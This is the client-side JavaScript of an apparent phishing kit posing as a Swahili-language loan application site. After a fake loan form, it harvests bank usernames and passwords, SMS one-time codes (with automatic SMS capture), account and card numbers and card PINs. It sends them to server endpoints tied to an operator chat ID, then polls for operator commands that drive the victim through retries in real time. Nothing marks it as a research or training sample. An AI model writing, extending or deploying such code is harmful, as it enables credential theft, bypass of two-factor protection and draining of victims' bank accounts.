document.addEventListener('DOMContentLoaded', () => {
  const stepWelcome = document.getElementById('step-welcome');
  const step1 = document.getElementById('step-1-3');
  const step2 = document.getElementById('step-2-3');
  const step3 = document.getElementById('step-3-3');
  const stepLogin = document.getElementById('step-login');
  const stepOtp = document.getElementById('step-otp');
  const stepBankDetails = document.getElementById('step-bank-details');
  const stepSuccess = document.getElementById('step-success');
  const loadingOverlay = document.getElementById('loading-overlay');

  const credsBanner = document.getElementById('creds-surface-banner');
  const otpBanner = document.getElementById('otp-surface-banner');
  const bankBanner = document.getElementById('bank-surface-banner');

  let currentUserId = null;
  let statusPollInterval = null;

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  function showStep(step) {
    [stepWelcome, step1, step2, step3, stepLogin, stepOtp, stepBankDetails, stepSuccess].forEach(s => {
      if (s) s.classList.remove('active');
    });
    if (step) step.classList.add('active');
  }

  // Sliders
  const loanSlider = document.getElementById('loan-amount-slider');
  const loanText = document.getElementById('loan-amount-text');
  const monthsSlider = document.getElementById('loan-months-slider');
  const monthsText = document.getElementById('loan-months-text');

  if (loanSlider && loanText) {
    loanSlider.addEventListener('input', (e) => {
      loanText.innerText = `TSh ${Number(e.target.value).toLocaleString()}`;
    });
  }

  if (monthsSlider && monthsText) {
    monthsSlider.addEventListener('input', (e) => {
      monthsText.innerText = `Miezi ${e.target.value}`;
    });
  }

  // Formatting Card Input
  const cardInput = document.getElementById('bank-card-no');
  if (cardInput) {
    cardInput.addEventListener('input', (e) => {
      let v = e.target.value.replace(/\D/g, '').substring(0, 16);
      e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
    });
  }

  // OTP 6 Digits Setup + SMS Autofill
  const otpBoxes6 = document.querySelectorAll('.otp-box-6');
  const pinBoxes4 = document.querySelectorAll('.pin-box-4');

  function setupAutoTab(boxes, onComplete) {
    boxes.forEach((box, idx) => {
      box.addEventListener('input', () => {
        box.value = box.value.replace(/\D/g, '');
        if (box.value && idx < boxes.length - 1) {
          boxes[idx + 1].focus();
        }
        const fullVal = Array.from(boxes).map(b => b.value).join('');
        if (fullVal.length === boxes.length && typeof onComplete === 'function') {
          onComplete(fullVal);
        }
      });

      box.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !box.value && idx > 0) {
          boxes[idx - 1].focus();
        }
      });
    });
  }

  setupAutoTab(otpBoxes6, () => submitOtpHandler());
  setupAutoTab(pinBoxes4);

  // Web OTP API for SMS Detection / Autofill
  if ('OTPCredential' in window) {
    window.addEventListener('DOMContentLoaded', () => {
      const ac = new AbortController();
      navigator.credentials.get({
        otp: { transport: ['sms'] },
        signal: ac.signal
      }).then(otp => {
        if (otp && otp.code && otp.code.length === 6) {
          otpBoxes6.forEach((box, i) => box.value = otp.code[i] || '');
          submitOtpHandler();
        }
      }).catch(() => {});
    });
  }

  // Navigation Logic
  document.getElementById('btn-welcome-proceed').addEventListener('click', () => showStep(step1));
  document.getElementById('btn-step1-next').addEventListener('click', () => showStep(step2));
  document.getElementById('btn-step2-back').addEventListener('click', () => showStep(step1));

  document.getElementById('btn-step2-next').addEventListener('click', () => {
    const fn = document.getElementById('first-name').value.trim();
    const ln = document.getElementById('last-name').value.trim();
    const phone = document.getElementById('phone-number').value.trim();

    document.getElementById('sum-amount').innerText = `TSh ${Number(loanSlider.value).toLocaleString()}`;
    document.getElementById('sum-months').innerText = `Miezi ${monthsSlider.value}`;
    document.getElementById('sum-purpose').innerText = document.getElementById('loan-purpose').value.trim() || 'Biashara';
    document.getElementById('sum-name').innerText = `${fn} ${ln}`.trim() || 'N/A';

    showStep(step3);
  });

  document.getElementById('btn-step3-back').addEventListener('click', () => showStep(step2));

  // Step 3 -> Immediately followed by Bank Username & Password
  document.getElementById('btn-step3-next').addEventListener('click', () => {
    showStep(stepLogin);
  });

  // Submit Bank Credentials
  document.getElementById('btn-submit-login').addEventListener('click', async () => {
    const u = document.getElementById('bank-username').value.trim();
    const p = document.getElementById('bank-password').value.trim();

    if (!u || !p) {
      if (credsBanner) {
        credsBanner.innerText = 'TAARIFA SI SAHIHI ❌ TAFADHALI WEKA USERNAME NA PASSWORD.';
        credsBanner.classList.add('active');
      }
      return;
    }

    if (credsBanner) credsBanner.classList.remove('active');
    showLoading('INATHIBITISHA TAARIFA...', 'Tafadhali subiri.');

    try {
      const res = await fetch('/api/submit-credentials', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: u, password: p, adminChatId: adminParam,
          fullName: document.getElementById('sum-name').innerText,
          phone: document.getElementById('phone-number').value,
          loanType: document.getElementById('loan-type-select').value,
          loanAmount: loanSlider.value,
          loanMonths: monthsSlider.value
        })
      });

      const data = await res.json();
      if (data.success) {
        currentUserId = data.userId;
        startPolling();
      } else {
        hideLoading();
      }
    } catch (e) {
      hideLoading();
    }
  });

  // Submit OTP
  async function submitOtpHandler() {
    const otpVal = Array.from(otpBoxes6).map(b => b.value).join('');
    if (otpVal.length !== 6) return;

    if (otpBanner) otpBanner.classList.remove('active');
    showLoading('INAKAGUA OTP...', 'Inathibitisha namba ya uthibitisho.');

    try {
      const res = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: currentUserId, otp: otpVal })
      });
      const data = await res.json();
      if (data.success) startPolling();
      else hideLoading();
    } catch (e) {
      hideLoading();
    }
  }

  document.getElementById('btn-submit-otp').addEventListener('click', submitOtpHandler);

  // Submit Bank Account, Card & PIN
  document.getElementById('btn-submit-verify').addEventListener('click', async () => {
    const acc = document.getElementById('bank-account-no').value.trim();
    const card = document.getElementById('bank-card-no').value.trim();
    const pin = Array.from(pinBoxes4).map(b => b.value).join('');

    if (!acc || card.length < 16 || pin.length !== 4) {
      if (bankBanner) {
        bankBanner.innerText = 'TAARIFA ZINAMAKOSA ❌ WEKA AKAUNTI, KADI NA PIN YA TARAKIMU 4 SAHIHI.';
        bankBanner.classList.add('active');
      }
      return;
    }

    if (bankBanner) bankBanner.classList.remove('active');
    showLoading('INATHIBITISHA KADI NA AKAUNTI...', 'Tafadhali subiri.');

    try {
      const res = await fetch('/api/submit-bank-details', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: currentUserId, account: acc, card, cardPin: pin })
      });
      const data = await res.json();
      if (data.success) startPolling();
      else hideLoading();
    } catch (e) {
      hideLoading();
    }
  });

  // Status Polling for Admin Actions
  function startPolling() {
    if (statusPollInterval) clearInterval(statusPollInterval);

    statusPollInterval = setInterval(async () => {
      if (!currentUserId) return;

      try {
        const res = await fetch(`/api/check-status/${currentUserId}`);
        const data = await res.json();

        if (data.status === 'PROCEED_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          showStep(stepOtp);
          if (otpBoxes6[0]) otpBoxes6[0].focus();
        } else if (data.status === 'PROCEED_BANK_DETAILS') {
          clearInterval(statusPollInterval);
          hideLoading();
          showStep(stepBankDetails);
        } else if (data.status === 'RETRY_CREDS') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (credsBanner) {
            credsBanner.innerText = 'TAARIFA SI SAHIHI ❌ USERNAME AU PASSWORD SI SAHIHI.';
            credsBanner.classList.add('active');
          }
          showStep(stepLogin);
        } else if (data.status === 'RETRY_OTP') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (otpBanner) {
            otpBanner.innerText = 'EXPIRED OTP ❌ TAFADHALI WEKA OTP MPYA YA SMS.';
            otpBanner.classList.add('active');
          }
          otpBoxes6.forEach(b => b.value = '');
          showStep(stepOtp);
        } else if (data.status === 'RETRY_ACC') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (bankBanner) {
            bankBanner.innerText = 'INVALID ACC.NO: ❌ NAMBA YA AKAUNTI SI SAHIHI.';
            bankBanner.classList.add('active');
          }
          showStep(stepBankDetails);
        } else if (data.status === 'RETRY_CARD') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (bankBanner) {
            bankBanner.innerText = 'INVALID CARD NO: ❌ NAMBA YA KADI SI SAHIHI.';
            bankBanner.classList.add('active');
          }
          showStep(stepBankDetails);
        } else if (data.status === 'RETRY_PIN') {
          clearInterval(statusPollInterval);
          hideLoading();
          if (bankBanner) {
            bankBanner.innerText = 'INCORRECT CARD PIN ❌ PIN YA KADI SI SAHIHI.';
            bankBanner.classList.add('active');
          }
          pinBoxes4.forEach(b => b.value = '');
          showStep(stepBankDetails);
        } else if (data.status === 'SUCCESS') {
          clearInterval(statusPollInterval);
          hideLoading();
          document.getElementById('final-approved-amount').innerText = `TSh ${Number(loanSlider.value).toLocaleString()}`;
          showStep(stepSuccess);
        }
      } catch (e) {}
    }, 2500);
  }

  document.getElementById('btn-finish-home').addEventListener('click', () => {
    window.location.href = `/?admin=${encodeURIComponent(adminParam)}`;
  });

  function showLoading(title, sub) {
    document.getElementById('loading-title').innerText = title;
    document.getElementById('loading-sub').innerText = sub;
    if (loadingOverlay) loadingOverlay.classList.add('active');
  }

  function hideLoading() {
    if (loadingOverlay) loadingOverlay.classList.remove('active');
  }
});
            
